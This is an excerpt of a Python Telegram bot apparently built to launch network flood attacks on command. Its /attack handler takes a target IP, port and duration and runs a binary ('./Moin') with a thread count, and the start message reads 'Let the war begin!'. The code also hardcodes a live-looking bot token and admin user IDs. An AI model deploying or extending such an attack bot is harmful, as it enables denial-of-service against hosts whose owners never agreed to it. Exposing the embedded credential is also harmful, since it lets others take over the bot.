...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7156732980:AAGjcyKSZ11RdNkh02j03MA1KhXQAayrf-0'
ADMIN_USER_ID = [8035098965,7209762563]
ADMIN_USER_ID = [8035098965,7209762563]
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Let the war begin! ⚔️💥 MADE BY @SHADE_OWNER*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>* MADE BY @SHADE_OWNER", parse_mode='Markdown')
        return
    ...
    if argument_type == 3:
        ...
        attack_command = f"./Moin {ip} {port} {duration} {threads}"
